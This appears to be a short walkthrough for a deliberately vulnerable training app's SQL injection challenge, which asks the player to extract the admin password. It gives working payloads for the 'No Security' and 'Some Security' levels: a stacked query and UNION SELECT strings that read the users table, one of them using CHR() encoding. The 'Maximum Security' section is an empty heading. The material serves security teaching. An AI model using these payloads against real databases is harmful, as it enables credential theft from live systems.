# SQL Injection Challenge

## Overview

The SQL Injection Challenge web page provides an interface for filtering the list of products by name.
The challenge is to find the password for 'admin'.

## No Security

At this difficulty, the query is passed exactly as it was entered. Also, errors are sent to the browser
verbatim, which shows the query being executed.

One way to solve the No Security version is a query like this one:

`%';select username as product_id, password as price, NULL as name from users where username like '`

## Some Security

At Some Security, the server adds backslashes in front of dangerous characters.

`1' UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(CHR(121)||CHR(82)||CHR(75)||CHR(87)||CHR(99)||CHR(71)||CHR(83)||CHR(72)||CHR(90)||CHR(66)||CHR(68)||CHR(87)||CHR(77)||CHR(86)||CHR(77)||CHR(104)||CHR(100)||CHR(108)||CHR(79)||CHR(73)||CHR(104)||CHR(102)||CHR(110)||CHR(68)||CHR(67)||CHR(78)||CHR(101)||CHR(75)||CHR(78)||CHR(114)||CHR(82)||CHR(69)||CHR(120)||CHR(107)||CHR(73)||CHR(70)||CHR(87)||CHR(120)||CHR(87)||CHR(114))||(CHR(113)||CHR(118)||CHR(107)||CHR(118)||CHR(113)),NULL-- CRxP`

This difficulty could be solved with a query of the form:
`1' UNION ALL SELECT NULL, password as name, NULL FROM users --`

## Maximum Security
